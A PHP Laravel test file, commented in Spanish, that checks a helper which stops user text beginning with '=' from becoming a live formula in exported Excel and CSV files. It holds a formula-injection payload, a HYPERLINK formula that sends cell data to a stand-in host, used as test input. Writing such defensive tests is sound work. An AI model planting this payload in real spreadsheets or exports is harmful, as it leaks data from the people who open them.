<?php

namespace Tests\Feature;

use App\Models\Usuario;
use App\Support\ExcelSinFormulas;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Str;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\IOFactory;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use Tests\MySqlTestCase;

/**
 * Un texto escrito por un usuario que empiece con "=" sale en el Excel descargado como
 * texto, no como una fórmula que Excel ejecutaría al abrirlo (App\Support\ExcelSinFormulas).
 * Corre en la transacción de la prueba.
 */
class ExcelSinFormulasTest extends MySqlTestCase
{
    private const MALICIOSO = '=HYPERLINK("http://ejemplo.invalid/robo?d="&A1,"Ver")';

    public function test_setCellValue_y_fromArray_guardan_texto(): void
    {
        $libro = new Spreadsheet();
        $hoja = $libro->getActiveSheet();
        $hoja->setCellValue('A1', self::MALICIOSO);
        $hoja->fromArray([['=1+1', '+57 412', '-', 12.5, 'CAT 320']], null, 'A2');

        $leida = $this->guardarYLeer($libro);

        $this->assertSame(DataType::TYPE_STRING, $leida->getCell('A1')->getDataType());
        $this->assertSame(self::MALICIOSO, $leida->getCell('A1')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $leida->getCell('A2')->getDataType());
        $this->assertSame('=1+1', $leida->getCell('A2')->getValue());
        // Lo demás no cambia: los números siguen siendo números y el texto, texto.
        $this->assertSame(DataType::TYPE_NUMERIC, $leida->getCell('D2')->getDataType());
        $this->assertSame('+57 412', $leida->getCell('B2')->getValue());
        $this->assertSame('CAT 320', $leida->getCell('E2')->getValue());
    }

    public function test_la_exportacion_de_consumibles_no_ejecuta_un_identificador_con_formula(): void
    {
        DB::table('consumibles')->insert([
            'FECHA'           => '2026-10-25',
            'IDENTIFICADOR'   => self::MALICIOSO,
            'CANTIDAD'        => 1,
            'TIPO_CONSUMIBLE' => 'GASOIL',
            'ESPECIFICACION'  => '=1+1',
            'UNIDAD'          => 'LITROS',
            'ESTADO_EQUIPO'   => 'PENDIENTE',
        ]);

        $resp = $this->actingAs($this->superAdmin())->get(route('consumibles.exportarCsv', [
            'fecha_desde' => '2026-10-25', 'fecha_hasta' => '2026-10-25', 'identificador' => 'ejemplo.invalid/robo',
        ]));
        $resp->assertOk();

        $hoja = IOFactory::load($resp->baseResponse->getFile()->getPathname())->getActiveSheet();
        // Fila 6 = encabezados, 7 = el registro. D = especificación, E = identificador.
        $this->assertSame('IDENTIFICADOR/PLACA', $hoja->getCell('E6')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $hoja->getCell('E7')->getDataType());
        $this->assertSame(self::MALICIOSO, $hoja->getCell('E7')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $hoja->getCell('D7')->getDataType());
    }

    public function test_celdaCsv_neutraliza_lo_que_excel_leeria_como_formula(): void
    {
        foreach (['=1+1', '+57', '-2+3', '@SUM(A1)', "\t=1"] as $v) {
            $this->assertSame("'" . $v, ExcelSinFormulas::celdaCsv($v));
        }
        foreach (['ABC-123', 'CAT 320', '', 12, null] as $v) {
            $this->assertSame($v, ExcelSinFormulas::celdaCsv($v));
        }
    }

    private function guardarYLeer(Spreadsheet $libro): \PhpOffice\PhpSpreadsheet\Worksheet\Worksheet
    {
        $tmp = tempnam(sys_get_temp_dir(), 'excel_sin_formulas_');
        try {
            (new \PhpOffice\PhpSpreadsheet\Writer\Xlsx($libro))->save($tmp);
            return IOFactory::load($tmp)->getActiveSheet();
        } finally {
            @unlink($tmp);
        }
    }

    private function superAdmin(): Usuario
    {
        $id = DB::table('usuarios')->insertGetId([
            'NOMBRE_COMPLETO'       => 'PRUEBA EXCEL',
            'CORREO_ELECTRONICO'    => 'prueba.excel.' . strtolower(Str::random(8)) . '@local.test',
            'PASSWORD_HASH'         => Hash::make(Str::random(16)),
            'ID_ROL'                => DB::table('roles')->value('ID_ROL'),
            'NIVEL_ACCESO_EQUIPOS'  => 1,
            'NIVEL_ACCESO_ALMACEN'  => 1,
            'ESTATUS'               => 'ACTIVO',
            'REQUIERE_CAMBIO_CLAVE' => 0,
            'PERMISOS'              => 'super.admin',
            'created_at'            => now(),
            'updated_at'            => now(),
        ]);

        return Usuario::find($id);
    }
}
